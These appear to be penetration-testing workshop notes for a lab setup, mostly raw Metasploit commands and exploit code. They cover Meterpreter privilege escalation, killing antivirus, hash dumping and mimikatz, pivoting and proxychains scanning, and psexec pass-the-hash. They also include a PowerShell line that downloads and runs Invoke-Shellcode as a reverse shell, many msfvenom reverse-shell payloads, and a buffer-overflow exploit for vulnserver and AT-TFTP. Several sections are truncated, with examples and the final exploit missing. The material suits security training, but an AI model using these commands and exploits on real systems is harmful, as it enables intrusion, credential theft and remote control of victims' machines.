meterpreter > getuid
Server username: win7-64-victim\Workshop
meterpreter > getsystem
...got system (via technique 1).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
 
meterpreter> ps
 
meterpreter> migrate 2110                                       (Make sure this process is running as: NT AUTHORITY\SYSTEM
 
meterpreter> run killav
 
meterpreter> run post/windows/gather/hashdump
 
meterpreter> run post/windows/gather/credentials/credential_collector
 
meterpreter > load mimikatz
 
meterpreter > kerberos
 
meterpreter > background
 
exit -y






###########################################
# Section 3: Tunneling For Fun and Profit #
###########################################

*****************************Enumerate the network you are on ***************************
 
meterpreter > run netenum
 
meterpreter > run netenum -ps -r 192.168.153.0/24
 
meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.153.0/24
 
 
 
********************************** Set up your Pivot **********************************
 
meterpreter > background
                                                        <-- background the session
        You want to get back to this prompt:
        msf exploit(handler) > back                     <--- you need to get to main msf> prompt
 
 
 
        sessions -l                                     <--find a session you want to pivot through (note the IP and session number)
       
        Now set up Pivot with a route add
        ---------------------------------
 
route print
 
route add 192.168.153.163 255.255.255.0 1                       <-- Use correct session id (2), it may be 3, or 4 (make sure you are on msf> prommpt, not meterpreter)
 
 
route print                                             <----- verify new route
 
******************************Scan through your Pivot ******************************
 
use auxiliary/scanner/portscan/tcp                      <-- Run aux modules through your pivot
 
set THREADS 10
 
set RHOSTS 192.168.153.0/24				<-- Keep changing this IP and re-running the scan until you find something you want to attack
 
set PORTS 445
 
run
 
 
************************* Lateral movement through your Pivot *************************
 
-- Option 1:
use exploit/windows/smb/psexec
 
set RHOST 192.168.153.163
 
set LPORT 2345
 
set SMBUser Workshop
 
set SMBPass password
 
exploit
 
 
 
 
-- Option 2:
use exploit/windows/smb/psexec
 
set SMBUser Workshop
 
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
 
set payload windows/meterpreter/reverse_tcp
 
set RHOST 192.168.153.163                      
 
set LHOST 192.168.153.164
 
set LPORT 5678
 
exploit
 
 
 
-- Option 3:
background
use auxiliary/admin/smb/upload_file
 
set SMBUser Workshop
 
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
 
set LPATH /home/strategicsec/binaries/wce.exe
 
set RPATH "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\wce.exe"
 
set RHOST 192.168.153.163                      
 
run
 
 
 
-- Option 4:
use auxiliary/admin/smb/upload_file
 
set SMBUser Workshop
 
set SMBPass password
 
set LPATH /home/strategicsec/binaries/wce.exe
 
set RPATH "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\wce.exe"
 
set RHOST 192.168.153.163                      
 
run
 
 
-- Option 5:
use exploit/multi/handler
set ExitOnSession false
set payload windows/meterpreter/reverse_https
set LHOST 192.168.153.164
set LPORT 4443
set EXITFUNC thread
exploit -j
 
 
 
sessions -i 1
shell
powershell -command "IEX (New-Object Net.WebClient).DownloadString('https://s3.amazonaws.com/StrategicSec-Files/Powersploit/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.153.164 -Lport 4443 -Force"
 
 
####################################
# Socks Tunneling with Proxychains #
####################################
--- Open a duplicate putty session to your Ubuntu host

sudo apt-get install -y proxychains
	strategicsec

sudo vi /etc/proxychains.conf                           <--- Make sure that last line of the file is: socks4  127.0.0.1 1080
 
        Comment out the proxy_dns, change the 9050 (tor port) to the metasploit socks proxy port (1080) and save it.
        socks4  127.0.0.1 1080
 
***************************Set up a Socks Proxy through your Pivot *************************
 
 
use auxiliary/server/socks4a
 
set SRVHOST 127.0.0.1
 
set SRVPORT 1080
 
run
 
        --- Go back to your other putty session with the meterpreter shell
cd ~
 
proxychains nmap -sT -PN -vv -sV --script=smb-os-discovery.nse -p 445 192.168.153.0/24          <--- This is going to be really slow
 
proxychains nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,1433,1521,3306,3389,8080,10000 192.168.153.0/24           <--- This is going to be really slow
 
 
        ---close the duplicate putty session to your Ubuntu host




##################
# Day 2 Homework #
##################
Please take screenshots of you doing videos 11-20 in this playlist
https://www.youtube.com/playlist?list=PL1512BD72E7C9FFCA

Please take screenshots of you doing all of the steps in section 3 of this pastebin

##################################
# Section 4: Exploit Development #
##################################

###############################################
# Chapter 9: Porting an exploit to Metasploit #
###############################################

***********************************************
* Vulnerable Server Versus Fuzzer and Company *
***********************************************


- Inside of your Windows7 VM - download the following file to the Desktop:
https://s3.amazonaws.com/StrategicSec-Files/SimpleExploitLab.zip
 
- Extract this zip file to your Desktop
 
- Go to folder C:\Users\Workshop\Desktop\ExploitLab\2-VulnServer, and run vulnserv.exe
 
- Open a new command prompt and type:
nc localhost 9999
 
- In the new command prompt window where you ran nc type:
HELP
 
- Go to folder C:\Users\Workshop\Desktop\ExploitLab\4-AttackScripts
- Right-click on 1-simplefuzzer.py and choose the option edit with notepad++
 
- Now double-click on 1-simplefuzzer.py
- You'll notice that vulnserv.exe crashes. Be sure to note what command and the number of As it crashed on.
 
 
- Restart vulnserv, and run 1-simplefuzzer.py again. Be sure to note what command and the number of As it crashed 

on.
 
- Now go to folder C:\Users\Workshop\Desktop\ExploitLab\3-OllyDBG and start OllyDBG. Choose 'File' -> 'Attach' and 

attach to process vulnserv.exe
 
- Go back to folder C:\Users\Workshop\Desktop\ExploitLab\4-AttackScripts and double-click on 1-simplefuzzer.py.
 
- Take note of the registers (EAX, ESP, EBP, EIP) that have been overwritten with As (41s).
 
- Now isolate the crash by restarting your debugger and running script 2-3000chars.py
 
- Calculate the distance to EIP by running script 3-3000chars.py
- This script sends 3000 nonrepeating chars to vulserv.exe and populates EIP with the value: 396F4338
 
4-count-chars-to-EIP.py
- In the previous script we see that EIP is overwritten with 396F4338 is 8 (38), C (43), o (6F), 9 (39)
- so we search for 8Co9 in the string of nonrepeating chars and count the distance to it
 
5-2006char-eip-check.py
- In this script we check to see if our math is correct in our calculation of the distance to EIP by overwriting EIP 

with 42424242
 
6-jmp-esp.py
- In this script we overwrite EIP with a JMP ESP (6250AF11) inside of essfunc.dll
 
7-first-exploit
- In this script we actually do the stack overflow and launch a bind shell on port 4444
 
8 - Take a look at the file vulnserv.rb and place it in your Ubuntu host via SCP or copy it and paste the code into 

the host.
 
 
------------------------------
 
cd /home/strategicsec/toolz/metasploit/modules/exploits/windows/misc
 
vi vulnserv.rb
 
 
 
cd ~/toolz/metasploit
 
./msfconsole
 
 
 
use exploit/windows/misc/vulnserv
set PAYLOAD windows/meterpreter/bind_tcp
set RHOST 192.168.153.163
set RPORT 9999
exploit







#########################################
# Chapter 12: Shellcoding with MSFVenom #
#########################################


-No shellcoding walk-through can be considered complete without covering Metasploit’s MSFPayload replacement 
msfvenom. 

-If you have never used msfvenom, the first thing you should do is read the help menu and memorize some of these 
flags:

-Example 1: If you wish to list all the payloads available, you can do the following (also the same for listing 
encoders, nops, or all):

./msfvenom -l payloads  


- Example 2: Generating a windows/meterpreter/reverse_tcp:
./msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP -f exe


- Example 3: To generate a payload that avoids certain bad characters:
./msfvenom -p windows/meterpreter/bind_tcp -b '\x00'  msfv


- Example 4: To generate a payload with a specific encoder, and then encode 3 times:
./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3  

-Example 5: Inject a payload to calc.exe, and save it as new.exe

./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > new.exe  



- msfvenom is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. 

-Note: msfvenom has replaced both msfpayload and msfencode as of June 8th, 2015.

-The advantages of msfvenom are:
One single tool
Standardized command line options
Increased speed
Msfvenom has a wide range of options available:

-MSFvenom command line usage
-You can see an example of the msfvenom command line below and its output:
-The msfvenom command and resulting shellcode above generates a Windows bind shell with three iterations of the 

-shikata_ga_nai encoder without any null bytes and in the python format.



-Here is a list of available formats that you can use

-MSFvenom options and uses

msfvenom -v or –var-name

-Usage: -v, –var-name <name>
-Specify a custom variable name to use for certain output formats. Assigning a name will change the output’s variable 

-from the default “buf” to whatever word you supplied.
-Default output example:



msfvenom -n, –nopsled

-You will occasionally need to add a few NOPs at the start of your payload. This will place a nopsled of [length] 
size at the beginning of your payload.

msfvenom –smallest

-If the “smallest” switch is used, msfvenom will attempt to create the smallest shellcode possible using the
selected encoder and payload.

msfvenom -c, –add-code

-Specify an additional win32 shellcode file to include, essentially creating a two (2) or more payloads in one (1) 
shellcode.

-Payload #1:

-Adding payload #2:

-Adding payload #3:

-Running the “cookies.exe” file will execute both message box payloads, as well as the bindshell using default 
settings (port 4444).

msfvenom -x, –template & -k, –keep

-The -x, or –template, option is used to specify an existing executable to use as a template when creating your 
executable payload.
-Using the -k, or –keep option in conjunction will preserve the template’s normal behavior and have your injected 
payload run as a separate thread.

- Creating Metasploit Payloads

-Often one of the most useful (and to the beginner underrated) abilities of Metasploit is the msfpayload module. 
Multiple payloads can be created with this module and it helps something that can give you a shell in almost any 
situation. For each of these payloads, you can go into msfconsole and select exploit/multi/handler. Run ‘set 
payload’ for the relevant payload used and configure all necessary options (LHOST, LPORT, etc). Execute and wait for 
the payload to be run. For the examples below it’s pretty self explanatory but LHOST should be filled in with your 
IP address (LAN IP if attacking within the network, WAN IP if attacking across the internet), and LPORT should be 
the port you wish to be connected back on.

- List payloads

msfvenom -l

- Binaries

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.153.164 LPORT=4444 -f elf > shell.elf

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.153.164 LPORT=4444 -f exe > shell.exe

- Mac
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.153.164 LPORT=7777 -f macho > shell.macho

- PHP

msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.153.164 LPORT=7777 -f raw  > shell.php


Scripting Payloads
- Python
msfvenom -p cmd/unix/reverse_python LHOST=192.168.153.164 LPORT=4444 -f raw > shell.py


- Bash
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.153.164 LPORT=4444 -f raw > shell.sh


- Perl
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.153.164 LPORT=4444 -f raw > shell.pl

-Shellcode

-For all shellcode options see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output 
code that is able to be cut and pasted in this language for your exploits.

- Linux Based Shellcode
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.153.164 LPORT=7777 -f python

- Windows Based Shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.153.164 LPORT=7777 -f python

- Mac Based Shellcode
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.153.164 LPORT=4444 -f python

-Handlers
-Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming 
shells. Handlers should be in the following format.

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164
set LPORT 4444
set ExitOnSession false
exploit -j

-Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘





#######################################################################
# Chapter 13: Converting Metasploit Exploits to a Stand Alone Exploit #
#######################################################################



Sometimes you might want to have a stand alone exploit, but the only option out there is a Metasploit module. Sure 
you could always just fire up Metasploit and use it… but what fun would that be? Besides it’s great to understand 
what’s going on under the hood of the Metasploit modules for both getting a handle on writing your own exploits and 
in the future even writing your own Metasploit modules and contributing back to the fantastic project.
Requirements

●     Windows XP – SP3 Virtual Machine (Victim).
●     StrategicSec Virtual Machine (Attacker).
●     Allied Telesyn TFTP Server 1.9 (Available here:   http://netsec.ws/wp-content/downloads/at-tftpd19.exe).
●     A willingness to give things a go.


-The Target

-We’re going to be adapting the attftp_long_filename.rb module located at 
-/home/strategicsec/toolz/metasploit/modules/exploits/windows/tftp/attftp_long_filename.rb and changing it into our 
own stand alone Python exploit. I’m by no means an experienced exploit writer so this is something that I’ve hacked 
together and figured out myself, there may be more optimal ways of doing each step. Full credit must be given to 
‘patrick’ the original author of the module along with prop’s to c0re since we’re pulling out his return address.
attftp_long_filename.rb


-Key Points

-Let’s run through some key points of the module and try and understand it a little better. Only parts that have an 
impact on our exploit will be examined.


-Default Exit Options

-As noted above, the default exit function is ‘process’. This the method in which the shellcode will exit after 
running and typically has an impact on how stable the vulnerable program will be after we send our exploit. This 
value should be noted for when we alter the shellcode used to suit our particular situation.

-Payload


-The payload is one of the key aspects we need to examine. This states that we have 210 bytes of space for our 
payload to reside in. Any larger and we may possibly run into issues of corruption or truncation of our exploit. Bad 
characters signify bytes that may impact our exploit. We need to ensure none of these characters are in our 
shellcode, and in this case it’s the almost universally bad null character ‘0x00′. For more information on bad 
characters search this site for writing basic buffer overflows. Finally, we see something called stack adjustment. 
Essentially because we’re so restricted in space we need to utilize something called a staged payload. What we’re 
doing is only sending a small first instruction which is designed to connect back to us and get the main payload, 
which wouldn’t regularly fit. Because of this we need to adjust the stack pointer back 3500 bytes so it has room to 
actually write the payload without overwriting itself.

-Targets


-Metasploit has a wide variety of targets for many exploits, which really is mostly a wide variety of suitable return 
addresses for each operating system. Because they are often using system DLLs, these addresses are not changed from 
computer to computer and ensures exploit compatibility. In our case, we wish to use the return address donated by 
c0re, Windows XP SP3.


-The Exploit


-The main part all the rest has been leading up to, the exploit itself. Let’s go through it line by line to ensure we 
understand.

-connect_udp



-This signifies that the exploit will be sent over UDP packets. This line connects sets the target as the values in 

-Metasploit such as RHOST and RPORT.

-sploit = "\x00\x02" +....

-The exploit is started with two hex values, ‘0x00′ and ‘0x02′ followed by a series of NOPs. The nops component is going to be variable in length depending on the length of your LAN IP, but always totaling 25 in total. As an example the LHOST value of ‘192.168.1.2’ has a length of 11, while an IP address of ‘192.168.100.123’ has a length of 15. If you want to play around with this fire up IRB (Interactive Ruby Shell) and assign a variable such as LHOST = ‘192.168.1.50’. The command LHOST.length will then tell you the length value – or just count how many characters 
there are including periods.

-sploit << payload.encoded



-This line encodes the payload specified within Metasploit and encodes it in the required format. Metasploit will internally determine what payloads are suitable given the space available and the target operating system, and they can be viewed with the ‘show payloads’ command. When we say ‘required format’ it means that it will exclude the nominated bad characters earlier in the exploit.


-sploit << [target['RET']].pack('V')


-This command will append the target return address into the exploit string. It’s presented as a variable here because within Metasploit you can nominate different operating systems, but for our purposes it will just be the Windows XP SP3 return address. The pack ‘V’ command signifies that it needs to be packed in little endian format, necessary for x86 processors.

-sploit << "x88\xc4\x28\xc3"

-Translated into commands, this is instructing the esp register to add 40 bytes and return. Necessary to position esp correctly for our exploit.

-sploit<< "\x00" + "netascii" + ...

-The final string of our exploit, this terminates the data stream in a format AT-TFTP is expecting.
-udp_sock.put(sploit)


-This instructs Metasploit to send the exploit via UDP.

disconnect_udp


-Self-explanatory but this signifies it has finished with the UDP socket.
-Adapting Each Part

-Let’s summarize what we need to achieve in our own exploit for it to get working based on the above, highlighted 
areas.
●     Create an appropriately sized NOP sled based off the size of LHOST
●     Nominate the return address and pack it in little endian format
●     Generate shellcode suitable for our situation (LHOST, etc)
●     Perform stack adjustment on the shellcode so our second stage can write correctly
●     Send the exploit over UDP with Python

About the only step in there which should sound a little challenging is this stack adjustment business, but really as with all things it’s a lot easier than it sounds.

-Let’s begin with a very bare bones UDP framework for sending information to the target.

#nano at-tftp.py
# AT-TFTP v1.9 Exploit
# Written for Strategic Security
import sys, socket
# Use in the form "python attftp_long_filename.py <IP Address> <Port> <Your IP Address>"
host = sys.argv[1]                        	# Receive IP from user
port = int(sys.argv[2])                	# Receive Port from user
exploit = ""                                     	# Out future exploit location
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Declare a UDP socket
client.sendto(exploit, (host, port))                                                      	# Send the exploit 

over UDP to the nominated addresses



-Now from here a lot of the information is going to be straight translations from the ruby counterparts. This includes creating the appropriate sized NOPs and the return address, along with the information we know will be sent to set up the exploit itself. Let’s incorporate that into our framework.

# AT-TFTP v1.9 Exploit
# Written for Strategic Security
import sys, socket

# Use in the form "python attftp_long_filename.py <Target IP Address> <Port> <Your IP

Address>"
host = sys.argv[1]                        	# Receive IP from user
lhost = sys.argv[3]
port = int(sys.argv[2])                	# Receive Port from user
ret = "\x53\x93\x42\x7e"         	# Return address - Source Metasploit (Little Endian)
nop = "\x90" * (25-len(lhost))	# Create a NOP string as to bring NOPs + LHOST up to 25 bytes
payload = ""                                   	# Payload to be calculated
exploit = "\x00\x02" + nop + payload + ret + "\x83\xc4\x28\xc3\x00netascii\x00"  	# Our exploit so far
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Declare a UDP socket
client.sendto(exploit, (host, port))         	# Send the exploit over UDP to the nominated
addresses




-Now we’ve got the known information we need to take the next step and factor in the stack adjustment for our staged payload.


-Stack Adjustment

-First we need to dump our payload into a raw hex file for further manipulation. Our payload, in this case, is going to be the meterpreter shell windows/meterpreter/reverse_nonx_tcp, chosen for it’s particularly small code footprint. 

-We use the command,

./msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=192.168.153.164 LPORT=4443 -a Windows -a x86 -o payload



-If we wish to confirm this has successfully outputted to the file we can use the command

#hexdump -C payload


-This will also come in handy when comparing the file against the post stack adjustment version. Next we need to find out what command we actually need to use to adjust the stack -3500 bytes.
This can be done using the Metasploit tool nasm_shell.rb, located here

/usr/share/metasploit-framework/tools/nasm_shell.rb.

-Putting in an assembly command will give you the hex machine instruction for that command. Since we want to subtract 3500 (0xDAC in hex) from the stack pointer we do the following,
Install nasm before proceeding to the next command

#sudo apt-get install nasm
#ruby /home/strategicsec/toolz/metasploit/tools/nasm_shell.rb
nasm > sub esp, 0xDAC
00000000  81ECAC0D0000  	sub esp,0xdac



-This tells us we need to use the commands 81EC AC0D 0000 to achieve adjusting the stack by 3500. We output this into a raw hex file. You can do it however you wish, such as with a hex editor, but a quick one line example with Perl is as follows,

#perl -e 'print "\x81\xec\xac\x0d\x00\x00"' > stackadj

-We now have two raw files - stackadj and our payload. We want to combine them both together which is a simple cat command,

#cat stackadj payload > shellcode

-To confirm we now have the file in a correct format we once more examine it with hexdump and compare it against our previous dump.

# hexdump -C shellcode



-It’s exactly the same as our past payload but with the stack adjustment having taken place at the start of the exploit. We’re almost done now, but we have one final step we need to do to the shellcode.

Encoding Shellcode

-In both our stack adjustment command and the payload itself, there are null characters which we need to remove. Msfencode comes to our rescue once again and we can reencode the payload without nulls.

strategicsec@ubuntu:~/toolz/metasploit$ cat shellcode | sudo ./msfvenom -b '\x00' -e x86/shikata_ga_nai -a x86 --platform win -f python



We can now cut and paste this shellcode into our python exploit. The final exploits look like the below.

Final Stand Alone Exploit





Running the Exploit


- Let’s test this against our Windows XP victim. Install AT-TFTP v1.9 from the link in the requirements. Ensure you unblock any firewall prompts to allow access. Because this is a staged payload, we need to set up Metasploit to catch the incoming shell. It will then send the second much larger buffer (770048 bytes) that we could never have fit into our exploit itself. Run the commands sequentially,

#msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_nonx_tcp
set LHOST 192.168.153.164
set LPORT 4443
exploit


- Now the fun stuff, we run the command,

# python at-tftp.py 192.168.153.164 69 192.168.153.163

- It goes without saying you should put in your own IP values, but it should maintain the format python. All going well, this is the result…


Congratulations, you’ve successfully modified your first Metasploit module into a standalone exploit.